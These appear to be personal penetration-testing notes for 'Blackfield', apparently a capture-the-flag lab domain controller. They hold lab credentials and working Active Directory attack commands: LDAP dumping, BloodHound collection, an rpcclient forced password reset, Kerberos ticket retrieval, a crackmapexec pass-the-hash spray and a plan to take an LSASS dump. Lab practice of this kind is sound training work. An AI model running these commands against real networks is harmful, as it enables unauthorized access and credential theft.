# Blackfield Notes

## Data 

IP: 10.129.229.17
OS:  DC01 Windows 10.0 Build 17763 x64 
Arch:
Hostname: DC01
DNS: BLACKFIELD.local
Domain: BLACKFIELD.local
Domain SID: S-1-5-21-4194615774-2175524697-3563712290
Machine Purpose: Domain Controller 
Services: 53 dns ,88 kerberos ,135, 593 rpc,389,445,,3268,5985, smb 445 (signing:True) (SMBv1:False), 
Service Languages:
Users: dc01, audit2020,support,svc_backup,lydericlefebvre and lots of generated
Email and Username Formatting:
Credentials:
```
support : #00^BlackKnight
audit2020 : ComplexP4ssw0rd!

```


#### Mindmap-per Service

- OS detect, run generate noting for nmap - check nmap

- 53
	- no domain transfer
	- `for ns in $(cat /usr/share/seclists/Discovery/DNS/$list.txt); do host $ns.$domain.$tld; done`
	- amass - found nothing..

- 88
- 135
	- NullAuth but not very good
	- CHECK support's access
- 389
- 445
	- Guest get read for `IPC$` and `profile$`
	- forensics share - probably audit2020
	- profile seems like a rabbithole of profiles
	- support has NETLOGON and SYSVOL
	- support spider plus
	- got sysvol share - policy 
- 593 `ldapsearch -x -H ldap://10.129.229.17 -D 'support@BLACKFIELD.local' -w '#00^BlackKnight' -b "DC=BLACKFIELD,DC=local" | tee -a support-DUMP-entire-domain.ldapsearch`
- 3268
- 5985
	- 
-
-
```
ldapsearch -x -H ldap://10.129.229.17 -D 'support@BLACKFIELD.local' -w '#00^BlackKnight' -b "DC=BLACKFIELD,DC=local" | tee -a support-DUMP-entire-domain.ldapsearch

python3 bloodhound.py --dns-tcp -c all -d BLACKFIELD.local -dc DC01.BLACKFIELD.local -ns 10.129.229.17 -u support -p '#00^BlackKnight'

```

- support forcepassword audit2020, but it might accomplish much, given that we cant just download lssas 
	- Probably other directories are just clues.. I just really really wanted that lsass.zip
- svc_backup is the only member of remote management
-
- Forensic SMB dump
	- Ipwn3dYourCompany 
-
-
-




#### Todo List

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
```
rpcclient -U support 10.10.10.192
> setuserinfo2 audit2020 23 'ComplexP4ssw0rd!'
```

- rescan tcp - done
- password spray - done
- profile seems like a rabbithole of profiles -check potentially

```
impacket-getTGT -dc-ip 10.129.229.17 'blackfield.local/audit2020'

smbget # use ccache file to auth in and get lsass.zip
```


- Is Ipwn3dYourCompany still enabled
- Is Ipwn3dYourCompany soft deleted?

- Is there a better way to view the firewall_rules.txt


Fallback on checking hashes if SIDs change
```
crackmapexec smb -u users.txt -H dumpedntmls.ntml 
```


/etc/ntpsec/ntp.conf 

Alternative to `ntpdate` https://ioflood.com/blog/ntpdate-linux-command/
```bash
chronyd
```
https://ioflood.com/blog/ntpdate-linux-command/
```bash
# Synchronize system time using ntpdate
sudo ntpdate pool.ntp.org

# Synchronize hardware time with system time
sudo hwclock --systohc
```